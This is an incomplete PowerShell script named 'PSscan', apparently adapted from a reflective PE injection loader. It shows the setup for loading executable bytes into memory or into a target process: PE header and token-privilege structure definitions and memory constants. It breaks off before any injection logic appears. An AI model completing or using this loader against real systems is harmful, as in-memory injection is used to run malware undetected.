function PSscan
{
<#
.SYNOPSIS
在64位系统运行32位程序
c:\Windows\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -file aa.ps1

#>

[CmdletBinding()]
Param(
    [Parameter(Position = 0)]
    [String]
    $ExeArgs
)

Set-StrictMode -Version 2


$RemoteScriptBlock = {
	[CmdletBinding()]
	Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Byte[]]
		$PEBytes,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[String]
		$FuncReturnType,
				
		[Parameter(Position = 2, Mandatory = $true)]
		[Int32]
		$ProcId,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		$ProcName,

        [Parameter(Position = 4, Mandatory = $true)]
        [Bool]
        $ForceASLR
	)
	
	###################################
	##########  Win32 Stuff  ##########
	###################################
	Function Get-Win32Types
	{
		$Win32Types = New-Object System.Object

		#Define all the structures/enums that will be used
		#	This article shows you how to do this with reflection: http://www.exploit-monday.com/2012/07/structs-and-enums-using-reflection.html
		$Domain = [AppDomain]::CurrentDomain
		$DynamicAssembly = New-Object System.Reflection.AssemblyName('DynamicAssembly')
		$AssemblyBuilder = $Domain.DefineDynamicAssembly($DynamicAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
		$ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('DynamicModule', $false)
		$ConstructorInfo = [System.Runtime.InteropServices.MarshalAsAttribute].GetConstructors()[0]


		############    ENUM    ############
		#Enum MachineType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MachineType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('Native', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('I386', [UInt16] 0x014c) | Out-Null
		$TypeBuilder.DefineLiteral('Itanium', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('x64', [UInt16] 0x8664) | Out-Null
		$MachineType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MachineType -Value $MachineType

		#Enum MagicType
		$TypeBuilder = $ModuleBuilder.DefineEnum('MagicType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR32_MAGIC', [UInt16] 0x10b) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_NT_OPTIONAL_HDR64_MAGIC', [UInt16] 0x20b) | Out-Null
		$MagicType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name MagicType -Value $MagicType

		#Enum SubSystemType
		$TypeBuilder = $ModuleBuilder.DefineEnum('SubSystemType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_UNKNOWN', [UInt16] 0) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_NATIVE', [UInt16] 1) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_GUI', [UInt16] 2) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CUI', [UInt16] 3) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_POSIX_CUI', [UInt16] 7) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_WINDOWS_CE_GUI', [UInt16] 9) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_APPLICATION', [UInt16] 10) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_BOOT_SERVICE_DRIVER', [UInt16] 11) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_RUNTIME_DRIVER', [UInt16] 12) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_EFI_ROM', [UInt16] 13) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_SUBSYSTEM_XBOX', [UInt16] 14) | Out-Null
		$SubSystemType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name SubSystemType -Value $SubSystemType

		#Enum DllCharacteristicsType
		$TypeBuilder = $ModuleBuilder.DefineEnum('DllCharacteristicsType', 'Public', [UInt16])
		$TypeBuilder.DefineLiteral('RES_0', [UInt16] 0x0001) | Out-Null
		$TypeBuilder.DefineLiteral('RES_1', [UInt16] 0x0002) | Out-Null
		$TypeBuilder.DefineLiteral('RES_2', [UInt16] 0x0004) | Out-Null
		$TypeBuilder.DefineLiteral('RES_3', [UInt16] 0x0008) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_DYNAMIC_BASE', [UInt16] 0x0040) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_FORCE_INTEGRITY', [UInt16] 0x0080) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLL_CHARACTERISTICS_NX_COMPAT', [UInt16] 0x0100) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_ISOLATION', [UInt16] 0x0200) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_SEH', [UInt16] 0x0400) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_NO_BIND', [UInt16] 0x0800) | Out-Null
		$TypeBuilder.DefineLiteral('RES_4', [UInt16] 0x1000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_WDM_DRIVER', [UInt16] 0x2000) | Out-Null
		$TypeBuilder.DefineLiteral('IMAGE_DLLCHARACTERISTICS_TERMINAL_SERVER_AWARE', [UInt16] 0x8000) | Out-Null
		$DllCharacteristicsType = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name DllCharacteristicsType -Value $DllCharacteristicsType

		###########    STRUCT    ###########
		#Struct IMAGE_DATA_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DATA_DIRECTORY', $Attributes, [System.ValueType], 8)
		($TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('Size', [UInt32], 'Public')).SetOffset(4) | Out-Null
		$IMAGE_DATA_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DATA_DIRECTORY -Value $IMAGE_DATA_DIRECTORY

		#Struct IMAGE_FILE_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_FILE_HEADER', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Machine', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSections', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToSymbolTable', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfSymbols', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfOptionalHeader', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt16], 'Public') | Out-Null
		$IMAGE_FILE_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_HEADER -Value $IMAGE_FILE_HEADER

		#Struct IMAGE_OPTIONAL_HEADER64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER64', $Attributes, [System.ValueType], 240)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt64], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt64], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt64], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt64], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt64], 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(108) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(224) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(232) | Out-Null
		$IMAGE_OPTIONAL_HEADER64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER64 -Value $IMAGE_OPTIONAL_HEADER64

		#Struct IMAGE_OPTIONAL_HEADER32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_OPTIONAL_HEADER32', $Attributes, [System.ValueType], 224)
		($TypeBuilder.DefineField('Magic', $MagicType, 'Public')).SetOffset(0) | Out-Null
		($TypeBuilder.DefineField('MajorLinkerVersion', [Byte], 'Public')).SetOffset(2) | Out-Null
		($TypeBuilder.DefineField('MinorLinkerVersion', [Byte], 'Public')).SetOffset(3) | Out-Null
		($TypeBuilder.DefineField('SizeOfCode', [UInt32], 'Public')).SetOffset(4) | Out-Null
		($TypeBuilder.DefineField('SizeOfInitializedData', [UInt32], 'Public')).SetOffset(8) | Out-Null
		($TypeBuilder.DefineField('SizeOfUninitializedData', [UInt32], 'Public')).SetOffset(12) | Out-Null
		($TypeBuilder.DefineField('AddressOfEntryPoint', [UInt32], 'Public')).SetOffset(16) | Out-Null
		($TypeBuilder.DefineField('BaseOfCode', [UInt32], 'Public')).SetOffset(20) | Out-Null
		($TypeBuilder.DefineField('BaseOfData', [UInt32], 'Public')).SetOffset(24) | Out-Null
		($TypeBuilder.DefineField('ImageBase', [UInt32], 'Public')).SetOffset(28) | Out-Null
		($TypeBuilder.DefineField('SectionAlignment', [UInt32], 'Public')).SetOffset(32) | Out-Null
		($TypeBuilder.DefineField('FileAlignment', [UInt32], 'Public')).SetOffset(36) | Out-Null
		($TypeBuilder.DefineField('MajorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(40) | Out-Null
		($TypeBuilder.DefineField('MinorOperatingSystemVersion', [UInt16], 'Public')).SetOffset(42) | Out-Null
		($TypeBuilder.DefineField('MajorImageVersion', [UInt16], 'Public')).SetOffset(44) | Out-Null
		($TypeBuilder.DefineField('MinorImageVersion', [UInt16], 'Public')).SetOffset(46) | Out-Null
		($TypeBuilder.DefineField('MajorSubsystemVersion', [UInt16], 'Public')).SetOffset(48) | Out-Null
		($TypeBuilder.DefineField('MinorSubsystemVersion', [UInt16], 'Public')).SetOffset(50) | Out-Null
		($TypeBuilder.DefineField('Win32VersionValue', [UInt32], 'Public')).SetOffset(52) | Out-Null
		($TypeBuilder.DefineField('SizeOfImage', [UInt32], 'Public')).SetOffset(56) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeaders', [UInt32], 'Public')).SetOffset(60) | Out-Null
		($TypeBuilder.DefineField('CheckSum', [UInt32], 'Public')).SetOffset(64) | Out-Null
		($TypeBuilder.DefineField('Subsystem', $SubSystemType, 'Public')).SetOffset(68) | Out-Null
		($TypeBuilder.DefineField('DllCharacteristics', $DllCharacteristicsType, 'Public')).SetOffset(70) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackReserve', [UInt32], 'Public')).SetOffset(72) | Out-Null
		($TypeBuilder.DefineField('SizeOfStackCommit', [UInt32], 'Public')).SetOffset(76) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapReserve', [UInt32], 'Public')).SetOffset(80) | Out-Null
		($TypeBuilder.DefineField('SizeOfHeapCommit', [UInt32], 'Public')).SetOffset(84) | Out-Null
		($TypeBuilder.DefineField('LoaderFlags', [UInt32], 'Public')).SetOffset(88) | Out-Null
		($TypeBuilder.DefineField('NumberOfRvaAndSizes', [UInt32], 'Public')).SetOffset(92) | Out-Null
		($TypeBuilder.DefineField('ExportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(96) | Out-Null
		($TypeBuilder.DefineField('ImportTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(104) | Out-Null
		($TypeBuilder.DefineField('ResourceTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(112) | Out-Null
		($TypeBuilder.DefineField('ExceptionTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(120) | Out-Null
		($TypeBuilder.DefineField('CertificateTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(128) | Out-Null
		($TypeBuilder.DefineField('BaseRelocationTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(136) | Out-Null
		($TypeBuilder.DefineField('Debug', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(144) | Out-Null
		($TypeBuilder.DefineField('Architecture', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(152) | Out-Null
		($TypeBuilder.DefineField('GlobalPtr', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(160) | Out-Null
		($TypeBuilder.DefineField('TLSTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(168) | Out-Null
		($TypeBuilder.DefineField('LoadConfigTable', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(176) | Out-Null
		($TypeBuilder.DefineField('BoundImport', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(184) | Out-Null
		($TypeBuilder.DefineField('IAT', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(192) | Out-Null
		($TypeBuilder.DefineField('DelayImportDescriptor', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(200) | Out-Null
		($TypeBuilder.DefineField('CLRRuntimeHeader', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(208) | Out-Null
		($TypeBuilder.DefineField('Reserved', $IMAGE_DATA_DIRECTORY, 'Public')).SetOffset(216) | Out-Null
		$IMAGE_OPTIONAL_HEADER32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_OPTIONAL_HEADER32 -Value $IMAGE_OPTIONAL_HEADER32

		#Struct IMAGE_NT_HEADERS64
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS64', $Attributes, [System.ValueType], 264)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER64, 'Public') | Out-Null
		$IMAGE_NT_HEADERS64 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS64 -Value $IMAGE_NT_HEADERS64
		
		#Struct IMAGE_NT_HEADERS32
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_NT_HEADERS32', $Attributes, [System.ValueType], 248)
		$TypeBuilder.DefineField('Signature', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FileHeader', $IMAGE_FILE_HEADER, 'Public') | Out-Null
		$TypeBuilder.DefineField('OptionalHeader', $IMAGE_OPTIONAL_HEADER32, 'Public') | Out-Null
		$IMAGE_NT_HEADERS32 = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS32 -Value $IMAGE_NT_HEADERS32

		#Struct IMAGE_DOS_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_DOS_HEADER', $Attributes, [System.ValueType], 64)
		$TypeBuilder.DefineField('e_magic', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cblp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_crlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cparhdr', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_minalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_maxalloc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ss', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_sp', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_csum', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ip', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_cs', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_lfarlc', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_ovno', [UInt16], 'Public') | Out-Null

		$e_resField = $TypeBuilder.DefineField('e_res', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$FieldArray = @([System.Runtime.InteropServices.MarshalAsAttribute].GetField('SizeConst'))
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 4))
		$e_resField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_oemid', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('e_oeminfo', [UInt16], 'Public') | Out-Null

		$e_res2Field = $TypeBuilder.DefineField('e_res2', [UInt16[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 10))
		$e_res2Field.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
		$IMAGE_DOS_HEADER = $TypeBuilder.CreateType()	
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER

		#Struct IMAGE_SECTION_HEADER
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_SECTION_HEADER', $Attributes, [System.ValueType], 40)

		$nameField = $TypeBuilder.DefineField('Name', [Char[]], 'Public, HasFieldMarshal')
		$ConstructorValue = [System.Runtime.InteropServices.UnmanagedType]::ByValArray
		$AttribBuilder = New-Object System.Reflection.Emit.CustomAttributeBuilder($ConstructorInfo, $ConstructorValue, $FieldArray, @([Int32] 8))
		$nameField.SetCustomAttribute($AttribBuilder)

		$TypeBuilder.DefineField('VirtualSize', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRawData', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToRelocations', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('PointerToLinenumbers', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfRelocations', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfLinenumbers', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$IMAGE_SECTION_HEADER = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_SECTION_HEADER -Value $IMAGE_SECTION_HEADER

		#Struct IMAGE_BASE_RELOCATION
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_BASE_RELOCATION', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('VirtualAddress', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('SizeOfBlock', [UInt32], 'Public') | Out-Null
		$IMAGE_BASE_RELOCATION = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_BASE_RELOCATION -Value $IMAGE_BASE_RELOCATION

		#Struct IMAGE_IMPORT_DESCRIPTOR
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_IMPORT_DESCRIPTOR', $Attributes, [System.ValueType], 20)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('ForwarderChain', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('FirstThunk', [UInt32], 'Public') | Out-Null
		$IMAGE_IMPORT_DESCRIPTOR = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_IMPORT_DESCRIPTOR -Value $IMAGE_IMPORT_DESCRIPTOR

		#Struct IMAGE_EXPORT_DIRECTORY
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('IMAGE_EXPORT_DIRECTORY', $Attributes, [System.ValueType], 40)
		$TypeBuilder.DefineField('Characteristics', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('TimeDateStamp', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('MajorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('MinorVersion', [UInt16], 'Public') | Out-Null
		$TypeBuilder.DefineField('Name', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Base', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('NumberOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfFunctions', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNames', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('AddressOfNameOrdinals', [UInt32], 'Public') | Out-Null
		$IMAGE_EXPORT_DIRECTORY = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_EXPORT_DIRECTORY -Value $IMAGE_EXPORT_DIRECTORY
		
		#Struct LUID
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID', $Attributes, [System.ValueType], 8)
		$TypeBuilder.DefineField('LowPart', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('HighPart', [UInt32], 'Public') | Out-Null
		$LUID = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID -Value $LUID
		
		#Struct LUID_AND_ATTRIBUTES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('LUID_AND_ATTRIBUTES', $Attributes, [System.ValueType], 12)
		$TypeBuilder.DefineField('Luid', $LUID, 'Public') | Out-Null
		$TypeBuilder.DefineField('Attributes', [UInt32], 'Public') | Out-Null
		$LUID_AND_ATTRIBUTES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name LUID_AND_ATTRIBUTES -Value $LUID_AND_ATTRIBUTES
		
		#Struct TOKEN_PRIVILEGES
		$Attributes = 'AutoLayout, AnsiClass, Class, Public, SequentialLayout, Sealed, BeforeFieldInit'
		$TypeBuilder = $ModuleBuilder.DefineType('TOKEN_PRIVILEGES', $Attributes, [System.ValueType], 16)
		$TypeBuilder.DefineField('PrivilegeCount', [UInt32], 'Public') | Out-Null
		$TypeBuilder.DefineField('Privileges', $LUID_AND_ATTRIBUTES, 'Public') | Out-Null
		$TOKEN_PRIVILEGES = $TypeBuilder.CreateType()
		$Win32Types | Add-Member -MemberType NoteProperty -Name TOKEN_PRIVILEGES -Value $TOKEN_PRIVILEGES

		return $Win32Types
	}

	Function Get-Win32Constants
	{
		$Win32Constants = New-Object System.Object
		
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_COMMIT -Value 0x00001000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RESERVE -Value 0x00002000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_NOACCESS -Value 0x01
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READONLY -Value 0x02
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_READWRITE -Value 0x04
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_WRITECOPY -Value 0x08
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE -Value 0x10
		$Win32Constants | Add-Member -MemberType NoteProperty -Name PAGE_EXECUTE_READ -Value 0x20
